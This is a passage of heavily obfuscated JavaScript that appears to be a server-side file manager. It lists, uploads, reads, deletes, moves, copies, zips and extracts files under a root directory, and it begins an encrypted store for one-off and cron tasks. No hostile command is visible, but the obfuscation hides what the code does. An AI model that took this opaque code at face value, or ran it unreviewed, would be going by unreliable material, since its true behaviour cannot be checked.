            l += b[cc(0x48c)](b[cc(0x532)](b['YGqGJ'](0x2e, v), w), x);
            const B = {
                'name': A,
                'isDir': A['endsWith']('/') || b['srkAo'](b[cc(0x768)](y, 0x10), 0x0),
                'method': r,
                'crc': s,
                'size': u,
                'compressedSize': t,
                'encrypted': b[cc(0x4ac)](b[cc(0x8ca)](q, 0x1), 0x0),
                'zip64': b[cc(0x3e9)](t, 0xffffffff) || u === 0xffffffff || b[cc(0x3e9)](z, 0xffffffff),
                'data': null
            };
            if (!B[cc(0x4d9)] && !B['encrypted'] && !B[cc(0x47f)]) {
                if (b[cc(0x85c)](z + 0x1e, c['length']) && b[cc(0x3e9)](c[cc(0x61e)](z), 0x4034b50)) {
                    const C = c[cc(0x658)](b[cc(0x6b7)](z, 0x1a)), D = c[cc(0x658)](b['hlpEF'](z, 0x1c)), E = b[cc(0x6c8)](b[cc(0x44f)](b['fjSLL'](z, 0x1e), C), D);
                    b['TRysi'](b[cc(0x7da)](E, t), c[cc(0x7f5)]) && (B[cc(0x37d)] = c['slice'](E, b[cc(0x532)](E, t)));
                }
            }
            k[cc(0x39c)](B);
        }
        return k;
    }
    static [a0aY(0x428)](a) {
        const cd = a0aY, b = {
                'lOKnq': function (c, d) {
                    return c === d;
                }
            };
        if (b['lOKnq'](a['method'], 0x0))
            return a[cd(0x37d)];
        if (b[cd(0x960)](a[cd(0x75b)], 0x8))
            return a0n[cd(0x92f)](a[cd(0x37d)]);
        throw new Error(cd(0x4e5) + a[cd(0x75b)]);
    }
}
class a0Y {
    static async [a0aY(0x267)](a, b = ![]) {
        const ce = a0aY, c = {
                'wcchS': function (h, i) {
                    return h & i;
                },
                'lDDCt': function (h, i) {
                    return h || i;
                },
                'rpbgm': function (h, i) {
                    return h(i);
                },
                'gEYUF': 'Access\x20denied:\x20path\x20outside\x20root',
                'OUJys': ce(0x289)
            }, d = a0o[ce(0x334)](a0P[ce(0x882)], c[ce(0x754)](a, '.'));
        if (!c[ce(0x5d6)](a0W, d))
            throw new Error(c['gEYUF']);
        if (!a0l['existsSync'](d))
            throw new Error(c['OUJys']);
        const f = [], g = h => {
                const cf = ce, i = a0l[cf(0x1eb)](h);
                for (const j of i) {
                    const k = a0o[cf(0x265)](h, j), l = a0l[cf(0x53c)](k), m = new a0L();
                    m[cf(0x5ac)] = j, m['path'] = a0o['relative'](a0P[cf(0x882)], k), m[cf(0x7e0)] = l[cf(0x6ae)]() ? cf(0x341) : 'file', m[cf(0x5ca)] = l[cf(0x5ca)], m['mtime'] = l[cf(0x6a0)][cf(0x613)](), m[cf(0x2de)] = this[cf(0x5c8)](l[cf(0x2de)], l[cf(0x6ae)]()), m['mode_octal'] = '0o' + c['wcchS'](l[cf(0x2de)], 0x1ff)[cf(0x248)](0x8), m[cf(0x5b1)] = l[cf(0x3e4)] + ':' + l[cf(0x745)], f['push'](m), b && l[cf(0x6ae)]() && g(k);
                }
            };
        return c[ce(0x5d6)](g, d), f;
    }
    static async [a0aY(0x207)](a) {
        const cg = a0aY, b = {
                'MSjkr': function (d, f) {
                    return d(f);
                },
                'CbYfc': 'directory',
                'GhCge': 'file'
            }, c = [];
        for (const d of a) {
            const f = a0o[cg(0x334)](a0P[cg(0x882)], d);
            if (!b[cg(0x2e7)](a0W, f))
                continue;
            try {
                const g = a0l[cg(0x53c)](f), h = this[cg(0x2f0)](f, a0l[cg(0x64e)][cg(0x436)]), i = this[cg(0x2f0)](f, a0l[cg(0x64e)][cg(0x976)]), j = this['_checkAccess'](f, a0l[cg(0x64e)]['X_OK']), k = new a0M();
                k[cg(0x7eb)] = a0o[cg(0x7e6)](a0P[cg(0x882)], f), k[cg(0x5ac)] = a0o[cg(0x966)](f), k['mode'] = this[cg(0x5c8)](g[cg(0x2de)], g[cg(0x6ae)]()), k['mode_octal'] = '0o' + (g['mode'] & 0x1ff)['toString'](0x8), k[cg(0x7e0)] = g[cg(0x6ae)]() ? b[cg(0x2c0)] : b['GhCge'], k[cg(0x5dd)] = h, k['writable'] = i, k[cg(0x4b1)] = j, c['push'](k);
            } catch (l) {
            }
        }
        return c;
    }
    static [a0aY(0x2f0)](a, b) {
        try {
            return a0l['accessSync'](a, b), !![];
        } catch {
            return ![];
        }
    }
    static ['_parseMode'](a) {
        const ch = a0aY, b = {
                'MNVEy': ch(0x51a),
                'yFkPP': ch(0x709),
                'HbbPZ': function (c, d, f) {
                    return c(d, f);
                },
                'gdxdu': ch(0x1e9)
            };
        if (typeof a === b[ch(0x1e3)])
            return a;
        if (typeof a === b[ch(0x244)]) {
            const c = a['trim']();
            if (/^[0-7]{3,4}$/['test'](c))
                return b[ch(0x4a0)](parseInt, c, 0x8);
        }
        throw new Error(b[ch(0x916)]);
    }
    static [a0aY(0x5c8)](a, b) {
        const ci = a0aY, c = {
                'LCrhK': function (i, j) {
                    return i & j;
                },
                'mRpXE': function (i, j, k) {
                    return i(j, k);
                }
            }, d = b ? 'd' : '-', f = [
                'r',
                'w',
                'x'
            ], g = c['LCrhK'](a, 0x1ff)[ci(0x248)](0x8)[ci(0x7ae)](0x3, '0');
        let h = d;
        for (const i of g) {
            const j = c[ci(0x300)](parseInt, i, 0xa);
            h += f[ci(0x499)]((k, l) => j & 0x4 >> l ? k : '-')[ci(0x265)]('');
        }
        return h;
    }
    static async [a0aY(0x6ec)](a, b = ![]) {
        const cj = a0aY, c = {
                'ZXtoz': function (g, h) {
                    return g(h);
                },
                'JCEyd': function (g, h) {
                    return g(h);
                },
                'hYfWX': function (g, h) {
                    return g(h);
                },
                'wtzqH': 'error'
            }, d = [];
        for (const [g, h] of Object[cj(0x271)](a)) {
            const i = a0o[cj(0x334)](a0P[cj(0x882)], g);
            if (!c[cj(0x7f3)](a0W, i)) {
                d[cj(0x39c)]({
                    'path': g,
                    'requested': String(h),
                    'applied': '',
                    'mode_octal': '',
                    'status': cj(0x718)
                });
                continue;
            }
            try {
                const j = this[cj(0x308)](h), k = m => {
                        const ck = cj;
                        a0l[ck(0x398)](m, j);
                    };
                if (b && a0l[cj(0x871)](i) && a0l[cj(0x53c)](i)['isDirectory']()) {
                    const m = n => {
                        const cl = cj;
                        c['ZXtoz'](k, n);
                        const o = a0l[cl(0x1eb)](n);
                        for (const p of o) {
                            const q = a0o[cl(0x265)](n, p);
                            a0l[cl(0x53c)](q)[cl(0x6ae)]() ? c[cl(0x87e)](m, q) : c['ZXtoz'](k, q);
                        }
                    };
                    m(i);
                } else
                    c[cj(0x4bf)](k, i);
                const l = j[cj(0x248)](0x8);
                d[cj(0x39c)]({
                    'path': g,
                    'requested': c[cj(0x7f3)](String, h),
                    'applied': l,
                    'mode_octal': '0o' + l,
                    'status': 'ok'
                });
            } catch (n) {
                d[cj(0x39c)]({
                    'path': g,
                    'requested': String(h),
                    'applied': '',
                    'mode_octal': '',
                    'status': c['wtzqH'],
                    'message': n['message']
                });
            }
        }
        const f = d[cj(0x4b3)](o => o[cj(0x62d)] === 'ok')['length'];
        return {
            'status': 'ok',
            'total': d[cj(0x7f5)],
            'success': f,
            'results': d
        };
    }
    static async [a0aY(0x78c)](a) {
        const cm = a0aY, b = {
                'cExOP': function (h, i) {
                    return h(i);
                },
                'jiIPk': function (h, i) {
                    return h > i;
                },
                'ZGGOF': function (h, i) {
                    return h * i;
                },
                'rrkTY': cm(0x610),
                'VMxoN': cm(0x5a2)
            }, c = a0o[cm(0x334)](a0P[cm(0x882)], a);
        if (!b[cm(0x81c)](a0W, c))
            throw new Error(cm(0x448));
        const d = a0l[cm(0x53c)](c);
        if (b[cm(0x804)](d[cm(0x5ca)], b[cm(0x90d)](0x400, 0x400)))
            throw new Error(cm(0x414));
        const f = a0l[cm(0x3f2)](c), g = this[cm(0x5f0)](f);
        return {
            'status': 'ok',
            'path': a0o['relative'](a0P['FILE_ROOT'], c),
            'content': g ? a0w['fromByteArray'](f) : f['toString'](b[cm(0x8e3)]),
            'encoding': g ? cm(0x2dd) : b[cm(0x6b3)],
            'is_binary': g,
            'size': d[cm(0x5ca)]
        };
    }
    static ['_isBinary'](a) {
        const cn = a0aY, b = {
                'FsMaQ': function (c, d) {
                    return c === d;
                },
                'jUHEy': function (c, d) {
                    return c < d;
                }
            };
        if (!a || b[cn(0x5df)](a[cn(0x7f5)], 0x0))
            return ![];
        for (let c = 0x0; b['jUHEy'](c, Math[cn(0x29a)](a[cn(0x7f5)], 0x200)); c++) {
            if (b[cn(0x5df)](a[c], 0x0))
                return !![];
        }
        return ![];
    }
    static async [a0aY(0x4c8)](a, b, c, d = null, f = null) {
        const co = a0aY, g = {
                'UlGPW': function (l, m) {
                    return l(m);
                },
                'hEAxg': function (l, m) {
                    return l > m;
                },
                'XVTSq': 'File\x20too\x20large',
                'KQhpg': function (l, m) {
                    return l(m);
                },
                'KvszK': co(0x3db),
                'sTZPs': '.upload_chunks',
                'ALDCD': function (l, m) {
                    return l === m;
                },
                'PdyIX': function (l, m) {
                    return l < m;
                }
            }, h = a0o[co(0x334)](a0P[co(0x882)], a);
        let j = h;
        b && (j = a0o[co(0x265)](h, b));
        if (!g[co(0x4e0)](a0W, j))
            throw new Error('Access\x20denied:\x20path\x20outside\x20root');
        !a0l['existsSync'](a0o[co(0x312)](j)) && a0l[co(0x38b)](a0o[co(0x312)](j), { 'recursive': !![] });
        const k = a0w['toByteArray'](c);
        if (g[co(0x46f)](k['length'], a0P[co(0x1f9)]))
            throw new Error(g[co(0x6c0)]);
        if (d !== null && f !== null) {
            const l = g[co(0x932)](Number, d), m = Number(f);
            if (Number['isNaN'](l) || Number['isNaN'](m))
                throw new Error(g['KvszK']);
            const n = a0o['join'](a0o[co(0x312)](j), g[co(0x6b2)], a0o[co(0x966)](j));
            !a0l[co(0x871)](n) && a0l[co(0x38b)](n, { 'recursive': !![] });
            const o = a0o['join'](n, co(0x6ef) + l);
            a0l[co(0x540)](o, k);
            const p = a0l[co(0x1eb)](n)[co(0x4b3)](s => s['startsWith'](co(0x6ef))), q = p[co(0x7f5)], r = g[co(0x7a4)](q, m);
            if (r) {
                const s = a0l[co(0x868)](j);
                for (let u = 0x0; g['PdyIX'](u, m); u++) {
                    const v = a0o[co(0x265)](n, 'chunk_' + u);
                    if (!a0l[co(0x871)](v)) {
                        s[co(0x661)]();
                        throw new Error(co(0x498) + u);
                    }
                    s[co(0x4ec)](a0l[co(0x3f2)](v));
                }
                s[co(0x53f)]();
                const t = a0o[co(0x312)](n);
                a0l[co(0x721)](n, {
                    'recursive': !![],
                    'force': !![]
                });
                try {
                    a0l[co(0x678)](t);
                } catch (w) {
                }
            }
            return {
                'status': 'ok',
                'path': a0o[co(0x7e6)](a0P[co(0x882)], j),
                'received': q,
                'total': m,
                'chunked': !![]
            };
        }
        return a0l[co(0x540)](j, k), {
            'status': 'ok',
            'path': a0o['relative'](a0P['FILE_ROOT'], j),
            'received': k[co(0x7f5)],
            'total': k['length'],
            'chunked': ![]
        };
    }
    static async [a0aY(0x91a)](a, b, c, d = null, f = null) {
        const cp = a0aY, g = {
                'CyVAQ': function (k, l) {
                    return k || l;
                },
                'HwZlq': function (k, l) {
                    return k(l);
                },
                'tPAUF': 'Access\x20denied:\x20path\x20outside\x20root',
                'wlVHS': function (k, l) {
                    return k > l;
                },
                'UJDIz': cp(0x414),
                'yDRCY': function (k, l) {
                    return k !== l;
                },
                'zmRiU': function (k, l) {
                    return k(l);
                },
                'ObPqE': cp(0x3db),
                'IulSV': cp(0x77e),
                'LKVDN': function (k, l) {
                    return k === l;
                },
                'FteWA': function (k, l) {
                    return k < l;
                }
            }, h = a0o[cp(0x334)](a0P[cp(0x882)], g[cp(0x302)](a, '.'));
        let j = h;
        b && (j = a0o[cp(0x265)](h, b));
        if (!g[cp(0x7b5)](a0W, j))
            throw new Error(g['tPAUF']);
        !a0l[cp(0x871)](a0o[cp(0x312)](j)) && a0l[cp(0x38b)](a0o['dirname'](j), { 'recursive': !![] });
        if (g[cp(0x22d)](c[cp(0x7f5)], a0P[cp(0x1f9)]))
            throw new Error(g[cp(0x5e0)]);
        if (d !== null && g[cp(0x805)](f, null)) {
            const k = Number(d), l = g[cp(0x2ac)](Number, f);
            if (Number[cp(0x638)](k) || Number[cp(0x638)](l))
                throw new Error(g[cp(0x2b4)]);
            const m = a0o[cp(0x265)](a0o[cp(0x312)](j), g['IulSV'], a0o[cp(0x966)](j));
            !a0l[cp(0x871)](m) && a0l[cp(0x38b)](m, { 'recursive': !![] });
            const n = a0o[cp(0x265)](m, cp(0x6ef) + k);
            a0l['writeFileSync'](n, c);
            const o = a0l[cp(0x1eb)](m)[cp(0x4b3)](r => r[cp(0x456)](cp(0x6ef))), p = o[cp(0x7f5)], q = g[cp(0x5af)](p, l);
            if (q) {
                const r = [];
                for (let t = 0x0; g[cp(0x3e1)](t, l); t++) {
                    const u = a0o[cp(0x265)](m, 'chunk_' + t);
                    if (!a0l[cp(0x871)](u))
                        throw new Error(cp(0x498) + t);
                    r[cp(0x39c)](a0l[cp(0x3f2)](u));
                }
                a0l[cp(0x540)](j, Buffer[cp(0x8ed)](r));
                const s = a0o[cp(0x312)](m);
                a0l[cp(0x721)](m, {
                    'recursive': !![],
                    'force': !![]
                });
                try {
                    a0l[cp(0x678)](s);
                } catch (v) {
                }
                return {
                    'status': 'ok',
                    'path': a0o[cp(0x7e6)](a0P[cp(0x882)], j),
                    'chunk_id': k,
                    'completed': !![],
                    'message': cp(0x278)
                };
            }
            return {
                'status': 'ok',
                'path': a0o[cp(0x7e6)](a0P['FILE_ROOT'], j),
                'chunk_id': k,
                'completed': ![],
                'message': 'Chunk\x20' + k + '\x20uploaded.\x20Waiting\x20for\x20remaining\x20blocks.'
            };
        }
        return a0l[cp(0x540)](j, c), {
            'status': 'ok',
            'path': a0o[cp(0x7e6)](a0P[cp(0x882)], j),
            'chunk_id': 0x0,
            'completed': !![],
            'message': 'File\x20uploaded\x20successfully.'
        };
    }
    static async [a0aY(0x611)](a) {
        const cq = a0aY, b = {
                'ZoAdI': function (g, h) {
                    return g(h);
                },
                'mJHpO': cq(0x448)
            }, c = a0o[cq(0x334)](a0P['FILE_ROOT'], a);
        if (!b['ZoAdI'](a0W, c))
            throw new Error(b[cq(0x687)]);
        if (!a0l['existsSync'](c))
            throw new Error(cq(0x426));
        const d = a0l[cq(0x53c)](c), f = await a0l[cq(0x951)]['readFile'](c);
        return {
            'path': a0o['relative'](a0P[cq(0x882)], c),
            'content': f,
            'size': d[cq(0x5ca)]
        };
    }
    static async [a0aY(0x2dc)](a) {
        const cr = a0aY, b = {
                'invrN': function (d, f) {
                    return d(f);
                },
                'gcehJ': 'deleted',
                'iJZCE': cr(0x63a),
                'jYvts': cr(0x993)
            }, c = [];
        for (const d of a) {
            const f = a0o['resolve'](a0P[cr(0x882)], d);
            if (!b[cr(0x95c)](a0W, f)) {
                c['push']({
                    'path': d,
                    'status': cr(0x718)
                });
                continue;
            }
            try {
                if (a0l[cr(0x871)](f)) {
                    const g = a0l[cr(0x53c)](f);
                    g['isDirectory']() ? a0l[cr(0x721)](f, {
                        'recursive': !![],
                        'force': !![]
                    }) : a0l['unlinkSync'](f), c[cr(0x39c)]({
                        'path': d,
                        'status': b['gcehJ']
                    });
                } else
                    c['push']({
                        'path': d,
                        'status': b[cr(0x934)]
                    });
            } catch (h) {
                c[cr(0x39c)]({
                    'path': d,
                    'status': b[cr(0x518)],
                    'message': h[cr(0x842)]
                });
            }
        }
        return c;
    }
    static async ['moveFiles'](a) {
        const cs = a0aY, b = {
                'GKaKI': function (d, f) {
                    return d(f);
                },
                'ITWTE': 'error'
            }, c = [];
        for (const [d, f] of Object[cs(0x271)](a)) {
            const g = a0o[cs(0x334)](a0P[cs(0x882)], d), h = a0o[cs(0x334)](a0P[cs(0x882)], f);
            if (!b['GKaKI'](a0W, g) || !b['GKaKI'](a0W, h)) {
                c[cs(0x39c)]({
                    'from': d,
                    'to': f,
                    'status': 'access_denied'
                });
                continue;
            }
            try {
                const i = a0o[cs(0x312)](h);
                !a0l['existsSync'](i) && a0l[cs(0x38b)](i, { 'recursive': !![] }), a0l['renameSync'](g, h), c[cs(0x39c)]({
                    'from': d,
                    'to': f,
                    'status': 'ok'
                });
            } catch (j) {
                c[cs(0x39c)]({
                    'from': d,
                    'to': f,
                    'status': b[cs(0x77f)],
                    'message': j[cs(0x842)]
                });
            }
        }
        return c;
    }
    static async [a0aY(0x972)](a) {
        const ct = a0aY, b = {
                'wrFGu': function (d, f) {
                    return d(f);
                },
                'rvCMZ': ct(0x718),
                'GVCWZ': ct(0x63a),
                'KPNGh': function (d, f, g) {
                    return d(f, g);
                }
            }, c = [];
        for (const [d, f] of Object['entries'](a)) {
            const g = a0o[ct(0x334)](a0P[ct(0x882)], d), h = a0o[ct(0x334)](a0P[ct(0x882)], f);
            if (!b['wrFGu'](a0W, g) || !b['wrFGu'](a0W, h)) {
                c[ct(0x39c)]({
                    'from': d,
                    'to': f,
                    'status': b[ct(0x4ba)]
                });
                continue;
            }
            try {
                if (!a0l[ct(0x871)](g)) {
                    c[ct(0x39c)]({
                        'from': d,
                        'to': f,
                        'status': b['GVCWZ']
                    });
                    continue;
                }
                const i = a0o[ct(0x312)](h);
                !a0l[ct(0x871)](i) && a0l[ct(0x38b)](i, { 'recursive': !![] });
                const j = a0l[ct(0x53c)](g);
                if (j[ct(0x6ae)]()) {
                    if (a0l[ct(0x550)])
                        a0l[ct(0x550)](g, h, { 'recursive': !![] });
                    else {
                        const k = (l, m) => {
                            const cu = ct;
                            if (a0l[cu(0x53c)](l)['isDirectory']()) {
                                if (!a0l[cu(0x871)](m))
                                    a0l['mkdirSync'](m, { 'recursive': !![] });
                                for (const n of a0l['readdirSync'](l)) {
                                    k(a0o[cu(0x265)](l, n), a0o[cu(0x265)](m, n));
                                }
                            } else
                                a0l[cu(0x47a)](l, m);
                        };
                        b['KPNGh'](k, g, h);
                    }
                } else
                    a0l['copyFileSync'](g, h);
                c[ct(0x39c)]({
                    'from': d,
                    'to': f,
                    'status': 'ok'
                });
            } catch (l) {
                c[ct(0x39c)]({
                    'from': d,
                    'to': f,
                    'status': ct(0x993),
                    'message': l[ct(0x842)]
                });
            }
        }
        return c;
    }
    static async ['createDirectory'](a) {
        const cv = a0aY, b = { 'easVs': cv(0x448) }, c = a0o['resolve'](a0P['FILE_ROOT'], a);
        if (!a0W(c))
            throw new Error(b[cv(0x6e3)]);
        return a0l[cv(0x38b)](c, { 'recursive': !![] }), {
            'status': 'ok',
            'path': a0o[cv(0x7e6)](a0P[cv(0x882)], c)
        };
    }
    static [a0aY(0x956)](a) {
        const cw = a0aY;
        return a0o[cw(0x7e6)](a0P['FILE_ROOT'], a) || '.';
    }
    static async [a0aY(0x6ac)](a, b, c = ![]) {
        const cx = a0aY, d = {
                'FLeTR': function (k, l) {
                    return k === l;
                },
                'othvN': 'items\x20required\x20(non-empty\x20array)',
                'CMuwn': function (k, l) {
                    return k(l);
                },
                'Djgxy': cx(0x448),
                'iFrSP': function (k, l) {
                    return k || l;
                },
                'IwMkG': cx(0x993),
                'kYwwb': 'skipped',
                'DDrWs': function (k, l, m) {
                    return k(l, m);
                }
            };
        if (!a)
            throw new Error('path\x20required');
        if (!Array[cx(0x2ad)](b) || d['FLeTR'](b['length'], 0x0))
            throw new Error(d['othvN']);
        const f = a0o[cx(0x334)](a0P['FILE_ROOT'], a);
        if (!d[cx(0x355)](a0W, f))
            throw new Error(d['Djgxy']);
        if (a0l['existsSync'](f) && a0l[cx(0x53c)](f)[cx(0x6ae)]())
            throw new Error(cx(0x531) + a);
        a0l[cx(0x38b)](a0o['dirname'](f), { 'recursive': !![] });
        if (a0l[cx(0x871)](f))
            a0l['unlinkSync'](f);
        const g = a0X[cx(0x69c)](f), h = [];
        let i = 0x0, j = ![];
        for (const k of b) {
            if (j) {
                h[cx(0x39c)]({
                    'item': k,
                    'status': cx(0x52c),
                    'added': 0x0
                });
                continue;
            }
            const l = a0o[cx(0x334)](a0P[cx(0x882)], d['iFrSP'](k, ''));
            try {
                if (!d[cx(0x355)](a0W, l)) {
                    h['push']({
                        'item': k,
                        'status': d[cx(0x74a)],
                        'added': 0x0
                    });
                    continue;
                }
                if (!a0l[cx(0x871)](l)) {
                    h[cx(0x39c)]({
                        'item': k,
                        'status': cx(0x63a),
                        'added': 0x0
                    });
                    continue;
                }
                const m = a0l[cx(0x53c)](l);
                let n = 0x0, o = ![];
                if (m[cx(0x727)]()) {
                    if (!g['add'](a0o[cx(0x966)](l), a0l[cx(0x3f2)](l), m[cx(0x6a0)])) {
                        j = !![], h[cx(0x39c)]({
                            'item': k,
                            'status': d[cx(0x63b)],
                            'added': 0x0
                        });
                        continue;
                    }
                    n = 0x1;
                } else {
                    if (m[cx(0x6ae)]()) {
                        const p = a0o[cx(0x966)](l), q = (r, s) => {
                                const cy = cx;
                                for (const t of a0l[cy(0x1eb)](r)) {
                                    const u = a0o[cy(0x265)](r, t), v = s ? s + '/' + t : t, w = a0l['statSync'](u);
                                    if (w[cy(0x6ae)]()) {
                                        if (!g[cy(0x23c)](v + '/', Buffer['alloc'](0x0), w[cy(0x6a0)], !![])) {
                                            o = !![];
                                            return;
                                        }
                                        q(u, v);
                                        if (o)
                                            return;
                                    } else {
                                        if (w[cy(0x727)]()) {
                                            if (!g['add'](v, a0l[cy(0x3f2)](u), w[cy(0x6a0)])) {
                                                o = !![];
                                                return;
                                            }
                                            n++;
                                        }
                                    }
                                }
                            };
                        d[cx(0x2af)](q, l, c ? '' : p);
                    } else {
                        h[cx(0x39c)]({
                            'item': k,
                            'status': d[cx(0x74a)],
                            'added': 0x0
                        });
                        continue;
                    }
                }
                if (o) {
                    j = !![], i += n, h[cx(0x39c)]({
                        'item': k,
                        'status': cx(0x74b),
                        'added': n
                    });
                    continue;
                }
                i += n, h[cx(0x39c)]({
                    'item': k,
                    'status': 'ok',
                    'added': n
                });
            } catch (r) {
                h[cx(0x39c)]({
                    'item': k,
                    'status': d[cx(0x74a)],
                    'added': 0x0
                });
            }
        }
        return g[cx(0x661)](), {
            'status': 'ok',
            'path': a0Y['_displayPath'](f),
            'entries': i,
            'size': a0l[cx(0x871)](f) ? a0l[cx(0x53c)](f)[cx(0x5ca)] : 0x0,
            'results': h
        };
    }
    static async [a0aY(0x3af)](a, b, c = !![], d = null) {
        const cz = a0aY, f = {
                'kFURT': cz(0x659),
                'XTaSQ': 'Access\x20denied:\x20path\x20outside\x20root',
                'MyBIz': function (p, q) {
                    return p(q);
                },
                'EKzsB': function (p, q) {
                    return p >= q;
                },
                'kAUGt': function (p, q) {
                    return p + q;
                },
                'IbNOU': function (p, q) {
                    return p >= q;
                },
                'oSTFn': function (p, q) {
                    return p + q;
                },
                'VkZnf': function (p, q) {
                    return p(q);
                },
                'tEZwu': function (p, q) {
                    return p !== q;
                },
                'RoMCQ': function (p, q) {
                    return p < q;
                }
            };
        if (!a)
            throw new Error(f[cz(0x203)]);
        const g = a0o[cz(0x334)](a0P['FILE_ROOT'], a);
        if (!a0W(g))
            throw new Error(f[cz(0x37b)]);
        if (!a0l['existsSync'](g))
            throw new Error(cz(0x733) + a);
        if (a0l['statSync'](g)['isDirectory']())
            throw new Error('Path\x20is\x20a\x20directory:\x20' + a);
        let h;
        if (b) {
            h = a0o[cz(0x334)](a0P[cz(0x882)], b);
            if (!f[cz(0x910)](a0W, h))
                throw new Error(cz(0x448));
            if (a0l[cz(0x871)](h) && !a0l['statSync'](h)['isDirectory']())
                throw new Error(cz(0x703) + b);
        } else
            h = a0o[cz(0x312)](g);
        a0l[cz(0x38b)](h, { 'recursive': !![] });
        let i;
        try {
            i = a0X[cz(0x57a)](g);
        } catch (p) {
            throw new Error('Not\x20a\x20zip\x20file:\x20' + a);
        }
        const j = (d || [])[cz(0x4b3)](q => q);
        let k = 0x0, l = 0x0, m = 0x0;
        const n = [];
        let o = ![];
        for (const q of i) {
            if (q['isDir'])
                continue;
            if (f[cz(0x5c3)](f[cz(0x991)](k, l), a0X[cz(0x722)]) || f[cz(0x67b)](m, a0X[cz(0x346)])) {
                l++;
                continue;
            }
            const r = q[cz(0x5ac)][cz(0x773)](/\\/g, '/');
            if (j['length']) {
                const v = r[cz(0x946)]('/')[cz(0x282)]();
                if (!j[cz(0x94f)](r) && !j['includes'](v)) {
                    l++;
                    continue;
                }
            }
            if (q['encrypted'] || q[cz(0x47f)] || f[cz(0x276)](m, q['size']) > a0X[cz(0x346)]) {
                l++;
                continue;
            }
            const s = a0o[cz(0x334)](h, r), t = a0o[cz(0x7e6)](h, s);
            if (t[cz(0x456)]('..') || a0o[cz(0x41a)](t)) {
                l++;
                continue;
            }
            if (!f[cz(0x70c)](a0W, s)) {
                l++;
                continue;
            }
            let u;
            try {
                u = a0X[cz(0x428)](q);
            } catch (w) {
                l++;
                continue;
            }
            if (f[cz(0x1ee)](a0X[cz(0x3ae)](u), q[cz(0x565)])) {
                l++;
                continue;
            }
            if (!c && a0l[cz(0x871)](s)) {
                l++;
                continue;
            }
            try {
                a0l[cz(0x38b)](a0o[cz(0x312)](s), { 'recursive': !![] }), a0l[cz(0x540)](s, u);
            } catch (x) {
                l++;
                continue;
            }
            k++, m += q[cz(0x5ca)], f[cz(0x75e)](n['length'], a0X['ZIP_MAX_LISTED_FILES']) ? n[cz(0x39c)](a0Y[cz(0x956)](s)) : o = !![];
        }
        return {
            'status': 'ok',
            'path': a0Y[cz(0x956)](g),
            'dest': a0Y[cz(0x956)](h),
            'extracted': k,
            'skipped': l,
            'files': n,
            'files_truncated': o
        };
    }
}
class a0Z {
    static [a0aY(0x6d9)] = 'kisama-store';
    static [a0aY(0x84d)] = 0x1;
    static ['state'] = {
        'enabled': ![],
        'locked': ![],
        'path': null,
        'key': null,
        'lastSavedAt': null
    };
    static [a0aY(0x452)]() {
        const cA = a0aY;
        for (const a of [
                process.env.USERPROFILE,
                process.env.HOME
            ]) {
            if (a && a0l[cA(0x871)](a))
                return a;
        }
        try {
            return a0p[cA(0x4fe)]() || process[cA(0x376)]();
        } catch (b) {
            return process[cA(0x376)]();
        }
    }
    static [a0aY(0x2c5)](a) {
        const cB = a0aY, b = {
                'BcsgI': 'hex',
                'UYxwB': function (c, d) {
                    return c === d;
                }
            };
        if (!a)
            return null;
        try {
            if (/^[0-9a-fA-F]{64}$/[cB(0x4ef)](a)) {
                const d = Buffer[cB(0x4ed)](a, b[cB(0x438)]);
                return b[cB(0x2fa)](d['length'], 0x20) ? d : null;
            }
            if (!/^[A-Za-z0-9+/]+={0,2}$/[cB(0x4ef)](a))
                return null;
            const c = Buffer[cB(0x4ed)](a, cB(0x2dd));
            return c['length'] === 0x20 ? c : null;
        } catch (f) {
            return null;
        }
    }
    static [a0aY(0x3cd)]() {
        const cC = a0aY, a = {
                'hajZJ': 'off',
                'MlQPm': cC(0x6be),
                'lBGuf': cC(0x57f),
                'hKMPV': '.tmp',
                'kiock': cC(0x5e1),
                'mmCmP': cC(0x6e9)
            }, b = a0Z[cC(0x582)];
        let c = (process.env.KSTORE || '')['trim']();
        if ([
                a['hajZJ'],
                '0',
                a[cC(0x4e6)],
                cC(0x906)
            ][cC(0x94f)](c[cC(0x216)]()))
            return a0D[cC(0x8e1)](a['lBGuf']), b;
        const d = (process.env.KSTORE_KEY || '')[cC(0x7b0)]();
        !c && (c = a0o[cC(0x265)](a0Z[cC(0x452)](), a[cC(0x54c)], cC(0x8a5)));
        const f = a0Z[cC(0x2c5)](d);
        if (!f) {
            if (d)
                a0D[cC(0x993)](a[cC(0x528)]);
            else
                a0D[cC(0x8e1)](a[cC(0x206)]);
            return b;
        }
        return b[cC(0x7eb)] = c, b[cC(0x810)] = f, b[cC(0x43c)] = !![], a0D[cC(0x8e1)](cC(0x218) + b['path']), b;
    }
    static ['encrypt'](a, b) {
        const cD = a0aY, c = {
                'YiRxs': cD(0x52a),
                'YEQBx': 'utf8',
                'kfwzt': cD(0x2dd)
            }, d = a0k[cD(0x489)](0xc), f = a0k[cD(0x46c)](c[cD(0x3bd)], a, d), g = Buffer[cD(0x8ed)]([
                f[cD(0x681)](Buffer[cD(0x4ed)](b, c[cD(0x682)])),
                f['final']()
            ]), h = {
                'nonce': d['toString'](c[cD(0x3a2)]),
                'tag': f[cD(0x71c)]()[cD(0x248)](cD(0x2dd)),
                'ciphertext': g[cD(0x248)](cD(0x2dd))
            };
        return Buffer[cD(0x4ed)](JSON[cD(0x852)](h), c[cD(0x682)])[cD(0x248)](c[cD(0x3a2)]);
    }
    static [a0aY(0x6db)](a, b) {
        const cE = a0aY, c = {
                'nyxNH': cE(0x2dd),
                'KvaFP': cE(0x854),
                'CZwpd': cE(0x610)
            }, d = JSON[cE(0x57a)](Buffer['from'](b, c[cE(0x904)])[cE(0x248)](cE(0x610)));
        if (!d[cE(0x264)] || !d[cE(0x4bc)] || !d[cE(0x5fc)])
            throw new Error(c[cE(0x2c4)]);
        const f = a0k['createDecipheriv'](cE(0x52a), a, Buffer[cE(0x4ed)](d['nonce'], c[cE(0x904)]));
        return f[cE(0x898)](Buffer[cE(0x4ed)](d[cE(0x4bc)], c[cE(0x904)])), Buffer['concat']([
            f['update'](Buffer[cE(0x4ed)](d[cE(0x5fc)], 'base64')),
            f[cE(0x2a3)]()
        ])['toString'](c[cE(0x45d)]);
    }
    static [a0aY(0x663)]() {
        const cF = a0aY, a = {
                'UobGW': function (c, d) {
                    return c !== d;
                },
                'riEUr': 'magic\x20不匹配',
                'cOEpk': function (c, d, f) {
                    return c(d, f);
                },
                'zzbLs': function (c, d) {
                    return c > d;
                },
                'zUayk': function (c, d) {
                    return c !== d;
                }
            }, b = a0Z[cF(0x582)];
        if (!b[cF(0x43c)])
            return {
                'onetasks': [],
                'crontasks': {}
            };
        try {
